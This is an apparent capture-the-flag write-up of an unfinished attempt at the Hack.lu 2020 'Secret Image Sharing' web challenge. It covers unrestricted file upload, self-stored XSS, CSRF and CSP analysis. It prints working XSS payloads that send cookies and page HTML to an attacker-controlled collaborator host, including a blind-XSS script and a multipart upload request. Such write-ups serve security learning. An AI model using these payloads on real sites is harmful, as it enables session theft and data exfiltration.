# [Hack.lu CTF] Challenge - Secret Image Sharing

**Hard Challenge, Focus of the event**

**Notes: @GeekMasher didn't finish this challenge in the allotted time**



## Facts
<!-- Things we know about the challenge that are true -->

[Endpoint - Client](https://index.onlysecrets.flu.xxx/)

*Testing Account:*
- `TestGeek:TestGeek`

[Endpoint - Admin user accessing site](https://submit.onlysecrets.flu.xxx/)

- Headless Chrome Browser
- Reader any page and execute JS

[JavaScript Client-side Code](https://index.onlysecrets.flu.xxx/static/js/main.js)

*Some of the API endpoints:*

- https://index.onlysecrets.flu.xxx/api/get
- https://index.onlysecrets.flu.xxx/api/image/{IMAGE}

NodeJS/Express Application from headers

Images of stored on a third-party domain


**Issues:**

- [Unrestricted file Upload](#unrestricted-file-upload)
  - Mime Type of the uploaded file not checked
- [Self XSS](#self-stored-xss)
- [CSRF](#csrf)



## Thoughts
<!-- Ideas and thoughts of attack vectors -->


### SSRF

- Use Admin url to send to a malicious site
- No, you seem to be able to submit any URL
  - No validation to the URL

- Pointed it to my server and see that see it connect
    - Headless Chrome Browser
    - Reader any page and execute JS



### Leak Content via Chrome Headless browser

- Get the Admin to access my malicious site and dump content

- https://{REDACTED}/files/blind.html

- Payloads from:
  - https://github.com/LewisArdern/bXSS
  - https://ardern.io/2017/12/10/blind-xss/


```html
<h1>Test</h1>

<script>
  (function () {
    if (window.name !== '__') {

      try { dcoo = document.cookie } catch (e) { dcoo = null }
      try { inne = document.body.parentNode.innerHTML } catch (e) { inne = null }
      try { durl = document.URL } catch (e) { durl = null }
      try { oloc = opener.location } catch (e) { oloc = null }
      try { oloh = opener.document.body.innerHTML } catch (e) { oloh = null }
      try { odoc = opener.document.cookie } catch (e) { odoc = null }

      var _ = document.createElementNS('http://www.w3.org/1999/xhtml', 'form');
      var __ = document.createElementNS('http://www.w3.org/1999/xhtml', 'input');
      var body = document.getElementsByTagName('body')[0];

      __.setAttribute('value', escape(
          dcoo + '\r\n\r\n' + inne + '\r\n\r\n' + durl + '\r\n\r\n' +
          oloc + '\r\n\r\n' + oloh + '\r\n\r\n' + odoc
      ));
      __.setAttribute('name', '_');
      _.appendChild(__);
      _.action = 'https://{REDACTED}/collaborator';
      _.method = 'post';
      //_.target='_blank';

      body.appendChild(_);
      window.name = '__';
      _.submit();
      //history.back();
    } else { window.name = '' }
  })();
</script>
```

- No Cookies or Extra Data sent along with the request

- Start hitting into CORS issues... This might be a dead end


### Unrestricted File Upload

- You can submit files (images: `jpg` || `png`) to the `index` site

- Maybe we could then get the admin panel to request the image which has embedded javascript or something
    - This would let you get the session token
    - Send this to collaborator

- Content type Check (only image/png or image/jpeg)

**IMPORTANT: No Mime type check**

- Able to upload HTML/JS content

- Used Blind-XSS payload

- **Issue:** Content type is set to PNG/JPG and Chrome isn't allowed to render/execute it
    - "Resource interpreted as Document but transferred with MIME type image/jpeg: "https://img.onlysecrets.flu.xxx/uploads/ZWoFk0X3ju6NayJeDrWA4a7/test3"."
- **Issue:** CSP Header
        - "Refused to apply inline style because it violates the following Content Security Policy directive"

- [Payload Location](https://img.onlysecrets.flu.xxx/uploads/ZWoFk0X3ju6NayJeDrWA4a7/test3)
- No authentication needed

- Curl works
    - `curl https://img.onlysecrets.flu.xxx/uploads/ZWoFk0X3ju6NayJeDrWA4a7/test3`

**CSP**

Used https://csp-evaluator.withgoogle.com/

```
default-src 'self'; base-uri 'none'; object-src 'none'
```

`default-src`: *"'self' can be problematic if you host JSONP, Angular or user uploaded files."*

Allows `unsafe-inline`

**Files**

PNG with custom attributes

Polyglot Files??

<!-- TODO: needs deeper diving -->
*To do if I have time*

- [ ] https://book.hacktricks.xyz/pentesting-web/file-upload
- [ ] https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20File
- [ ] https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs


### Self Stored XSS

- Found XSS in the File Image upload functionality
- The `description` content is rendered without escaping

- Stored XSS
- Needs accessing the following URL to trigger (not on "main" page)

**Payload**

```
PUT /api/image/test3 HTTP/1.1
Host: index.onlysecrets.flu.xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://index.onlysecrets.flu.xxx/
Content-Type: multipart/form-data; boundary=---------------------------309085703532381991481288763737
Origin: https://index.onlysecrets.flu.xxx
Content-Length: 448
DNT: 1
Connection: close
Cookie: SecretImageSession={REDACTED}; lastlogin={REDACTED}

-----------------------------309085703532381991481288763737
Content-Disposition: form-data; name="file1"; filename="1337.jpg"
Content-Type: image/png

GIF89a/*<audio src/onerror=window.location='https://{REDACTED}/collaborator/'+document.cookie>
-----------------------------309085703532381991481288763737
Content-Disposition: form-data; name="description"

<audio src/onerror=window.location='https://{REDACTED}/collaborator/'+document.cookie>
-----------------------------309085703532381991481288763737--
```

**Leak Full HTML Payload**

```htmlmixed=
<audio src/onerror=window.location='https://{REDACTED}/collaborator/'+btoa(unescape(encodeURIComponent(document.documentElement.innerHTML)))>
```

Need the headless browser to access this page


### CSRF

**Workflow**

- Create CSRF PoC to image item
  - https://{REDACTED}/files/csrf/req1-api_add.html
- Create 2nd CSRF PoC to push the image (XSS playload) to the server
  - https://{REDACTED}/files/csrf/req2-api_put.html
- Submit page to Admin open the image and exec payload
  - https://index.onlysecrets.flu.xxx/#thisismytestpayload
- This will redirect the user to my application sending
  - HTML content
  - Adding cookies


**CSRF - Request 1**

[See req1-api_add.html](writeups\2020\hack-lu\secret-image-sharing\payloads\csrf\req1-api_add.html)

Successfully created new item!

**CSRF - Request 2**

[See req2-api_put.html](writeups\2020\hack-lu\secret-image-sharing\payloads\csrf\req2-api_put.html)

- Failed to create a PUT request
  - CORS check failed
- CORS Bypass?
  - Chrome is up to date (from request headers)
  - Might have been able to do something with this
    - https://bugs.chromium.org/p/chromium/issues/detail?id=1064676

- Tried with `sendBeacon` and had the same issue

[See req3-api_sendBeacon.html](writeups\2020\hack-lu\secret-image-sharing\payloads\csrf\req3-api_sendBeacon.html)

Maybe `fetch(url, {mode='no-cors'})`?
- https://javascript.info/fetch-api#mode

Failed to bypass the CORP restrictions... Dead end unless new ideas.


### Escalating Self XSS

<!-- TODO: Implement this ASAP -->

Use iframes

Logout and Login sequence

- [Login](writeups\2020\hack-lu\secret-image-sharing\payloads\csrf\req4-login.html)
- [Logout](writeups\2020\hack-lu\secret-image-sharing\payloads\csrf\req5-logout.html)


**NOTE: Ran out of time**
